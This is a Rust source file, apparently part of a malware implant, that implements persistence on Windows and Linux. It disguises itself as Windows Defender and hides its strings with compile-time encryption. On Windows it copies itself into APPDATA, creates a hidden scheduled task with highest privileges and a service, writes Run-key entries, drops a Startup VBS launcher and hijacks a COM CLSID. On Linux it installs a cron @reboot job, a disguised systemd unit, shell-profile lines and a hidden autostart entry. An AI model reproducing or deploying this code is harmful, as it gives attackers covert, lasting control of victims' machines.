use encstr::astr;
use std::env;
use std::fs;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::path::Path;
use std::process::Command;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

// === Windows Persistence ===

#[cfg(target_os = "windows")]
use winreg::RegKey;
#[cfg(target_os = "windows")]
use winreg::enums;

#[cfg(target_os = "windows")]
static TARGET_BIN: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| astr!("defender.exe"));

#[cfg(target_os = "linux")]
static TARGET_DIR: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| astr!(".cache/defender"));
#[cfg(target_os = "linux")]
static TARGET_BIN: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| astr!("defender"));

pub fn persist() -> std::io::Result<()> {
    if env::current_exe().is_err() {
        return Ok(());
    }
    #[cfg(target_os = "windows")]
    return windows_persist();
    #[cfg(target_os = "linux")]
    return linux_persist();
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        Ok(())
    }
}

#[cfg(target_os = "windows")]
fn windows_persist() -> std::io::Result<()> {
    let current_exe = env::current_exe()?;

    if crate::util::is_dll::is_dll() {
        return dll_persistence(&current_exe);
    }

    let appdata = env::var(astr!("APPDATA"))
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::NotFound, astr!("APPDATA not set")))?;
    let target_path = Path::new(&appdata).join(&*TARGET_BIN);

    if current_exe != target_path {
        fs::copy(&current_exe, &target_path)?;
    }

    scheduled_task(&target_path);
    windows_service(&target_path);
    registry_runkey(&target_path);

    Ok(())
}

#[cfg(target_os = "windows")]
fn registry_runkey(target_path: &Path) {
    let path_str = target_path.to_string_lossy().to_string();
    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
    if let Ok((key, _)) = hkcu.create_subkey(astr!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
        let _ = key.set_value(astr!("WindowsDefender"), &path_str);
    }
}

#[cfg(target_os = "windows")]
fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
    let dll_str = dll_path.to_string_lossy().to_string();

    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
    if let Ok((key, _)) = hkcu.create_subkey(astr!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
        let rundll_cmd = format!("{}{}{}", astr!("rundll32.exe \""), &dll_str, astr!("\",NetClientMain"));
        let _ = key.set_value(astr!("WindowsDefender"), &rundll_cmd);
    }

    if let Ok(appdata) = env::var(astr!("APPDATA")) {
        let startup = Path::new(&appdata).join(astr!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        let _ = fs::create_dir_all(&startup);
        let vbs = format!("{}{}{}", astr!("Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\""), &dll_str, astr!("\"\",NetClientMain\", 0, False\n"));
        let _ = fs::write(startup.join(astr!("defender.vbs")), vbs);
    }

    let clsid_path = astr!("Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32");
    if let Ok((key, _)) = hkcu.create_subkey(clsid_path) {
        let _ = key.set_value(astr!(""), &dll_str);
        let _ = key.set_value(astr!("ThreadingModel"), &astr!("Apartment").to_string());
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn scheduled_task(target_path: &Path) {
    let path_str = target_path.to_string_lossy().to_string();
    let _ = Command::new(astr!("schtasks"))
        .args(&[
            astr!("/create"),
            astr!("/tn"),
            astr!("WindowsDefender"),
            astr!("/tr"),
            path_str,
            astr!("/sc"),
            astr!("onlogon"),
            astr!("/rl"),
            astr!("highest"),
            astr!("/f"),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
}

#[cfg(target_os = "windows")]
fn windows_service(target_path: &Path) {
    let path_str = target_path.to_string_lossy().to_string();
    let _ = Command::new(astr!("sc"))
        .args(&[
            astr!("create"),
            astr!("WindowsDefender"),
            astr!("binPath="),
            path_str,
            astr!("start="),
            astr!("auto"),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
    std::thread::sleep(std::time::Duration::from_secs(2));
    let _ = Command::new(astr!("sc"))
        .args(&[astr!("start"), astr!("WindowsDefender")])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
}

// === Linux Persistence ===

#[cfg(target_os = "linux")]
fn linux_persist() -> std::io::Result<()> {
    let home =
        env::var(astr!("HOME")).map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
    let target_dir = Path::new(&home).join(&*TARGET_DIR);
    let target_path = target_dir.join(&*TARGET_BIN);

    fs::create_dir_all(&target_dir)?;

    let current_exe = env::current_exe()?;

    if current_exe != target_path {
        fs::copy(&current_exe, &target_path)?;
        let _ = fs::set_permissions(
            &target_path,
            std::os::unix::fs::PermissionsExt::from_mode(0o755),
        );
        Command::new(&target_path).spawn().ok();
        std::process::exit(0);
    }

    cron_persistence(&target_path);
    systemd_persistence(&target_path);
    bashrc_persistence(&target_path);
    autostart_desktop(&target_path);

    Ok(())
}

#[cfg(target_os = "linux")]
fn cron_persistence(target_path: &Path) {
    let entry = astr!("@reboot ") + &target_path.display().to_string() + &astr!("\n");

    let output = Command::new(astr!("crontab")).arg(astr!("-l")).output();
    let existing = match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => String::new(),
    };

    if existing.contains(&target_path.to_string_lossy().to_string()) {
        return;
    }

    let new_cron = existing + &entry;
    let mut child = match Command::new(astr!("crontab"))
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(_) => return,
    };

    use std::io::Write;
    if let Some(mut stdin) = child.stdin.take() {
        let _ = stdin.write_all(new_cron.as_bytes());
    }
    let _ = child.wait();
}

#[cfg(target_os = "linux")]
fn systemd_persistence(target_path: &Path) {
    let home = match env::var(astr!("HOME")) {
        Ok(h) => h,
        Err(_) => return,
    };

    let service_dir = Path::new(&home).join(astr!(".config/systemd/user"));
    let service_file = service_dir.join(astr!("defender.service"));

    let _ = fs::create_dir_all(&service_dir);

    let unit = astr!("[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart=") + &target_path.display().to_string() + &astr!("\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n");

    if fs::write(&service_file, unit).is_err() {
        return;
    }

    let _ = Command::new(astr!("systemctl"))
        .args(&[astr!("--user"), astr!("enable"), astr!("defender.service")])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output();

    let _ = Command::new(astr!("systemctl"))
        .args(&[astr!("--user"), astr!("start"), astr!("defender.service")])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output();

    let _ = Command::new(astr!("systemctl"))
        .args(&[astr!("enable"), astr!("defender.service")])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output();
}

#[cfg(target_os = "linux")]
fn bashrc_persistence(target_path: &Path) {
    let home = match env::var(astr!("HOME")) {
        Ok(h) => h,
        Err(_) => return,
    };

    let target_str = target_path.to_string_lossy().to_string();
    let parent_str = target_path
        .parent()
        .map(|p| p.display().to_string())
        .unwrap_or_default();
    let line = astr!("\n# Startup\nexport PATH=\"$PATH:") + &parent_str + &astr!("\"\n") + &target_str + &astr!("\n");

    for rc_file in &[astr!(".bashrc"), astr!(".profile"), astr!(".zshrc"), astr!(".bash_profile")] {
        let rc_path = Path::new(&home).join(rc_file);
        if rc_path.exists() {
            if let Ok(content) = fs::read_to_string(&rc_path) {
                if content.contains(&target_str) {
                    continue;
                }
            }
            use std::io::Write;
            if let Ok(mut file) = fs::OpenOptions::new()
                .append(true)
                .create(true)
                .open(&rc_path)
            {
                let _ = file.write_all(line.as_bytes());
            }
        }
    }
}

#[cfg(target_os = "linux")]
fn autostart_desktop(target_path: &Path) {
    let home = match env::var(astr!("HOME")) {
        Ok(h) => h,
        Err(_) => return,
    };

    let autostart_dir = Path::new(&home).join(astr!(".config/autostart"));
    let _ = fs::create_dir_all(&autostart_dir);

    let desktop = astr!("[Desktop Entry]\nType=Application\nName=defender\nExec=") + &target_path.display().to_string() + &astr!("\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n");

    let _ = fs::write(autostart_dir.join(astr!("defender.desktop")), desktop);
}
